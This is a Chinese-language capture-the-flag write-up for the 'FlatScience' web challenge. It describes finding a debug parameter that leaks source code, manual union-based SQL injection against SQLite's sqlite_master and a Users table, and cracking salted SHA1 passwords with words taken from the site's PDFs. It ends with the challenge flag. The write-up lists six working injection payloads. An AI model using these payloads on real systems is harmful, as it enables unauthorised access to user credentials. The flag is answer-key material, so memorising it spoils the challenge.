# FlatScience

> sqlite3 注入 + pdf提取

## 思路分析

> 打开首页后是一个界面,有一些pdf链接和html链接.没啥思路,扫目录,发现robots.txt、admin.php、login.php这三个文件,robots.txt里面是后面的二个文件admin.php、login.php.访问admin.php,一个登录框,爆破密码失败,注入没痕迹.打开login.php,虽然爆破也失败,但返回的html源码里有一行注释,说是删除了debug参数,加上debug参数,得到了源码,sqlite3数据库,是存在注入的,可能是网络不好,sqlmap跑不出来,只能手工注入了.order by测出来只有2列,

> SQLite数据库中存在一个sqlite_master默认表,类似于mysql中的information_schema,可以在sqlite_master中查看所有的表名,以及之前执行过的建表语句,详细内容如下:

```
sqlite_master ---- SQLite的系统表.该表记录数据库中保存的表,索引,视图和触发器信息.在创建sqlite数据库时该表会自动创建
sqlite_master表包含5个字段：
type ---- 记录该项目的类型,如：table、index、view、trigger
name ---- 记录该项目的名称,如：表名、索引名等
tbl_name ---- 记录所从属的表名,如索引所在的表名.对于表来说该列就是表名本身.
rootpage ---- 记录项目在数据库页中存储的编号.对于试图和触发器该字段为0或者NULL
sql ---- 记录创建该项目的sql语句

```

> 获取到sqlite3后的数据后,得到账号和密码,从源码中得知密码是用Salz!当密码的sha1加密方式生成的.爆破时间很长,还不一定爆出来,这时想到pdf文件,密码很有可能存在这里面,把所有pdf下载,然后提取里面的词加密去遍历即可.得到admin账号的密码,admin.php登陆即可

## payload

> ' union select 1,name from sqlite_master where type='table' order by name --+

> ' union select name,sql from sqlite_master --+

> ' union select 1, sql from sqlite_master where type='table' and tbl_name='Users' --+

> ' union select 1,group_concat(name,"++++") from Users --+

> ' union select 1,group_concat(password,"++++") from Users --+

> ' union select 1,group_concat(hint,"++++") from Users --+


## flag

> flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}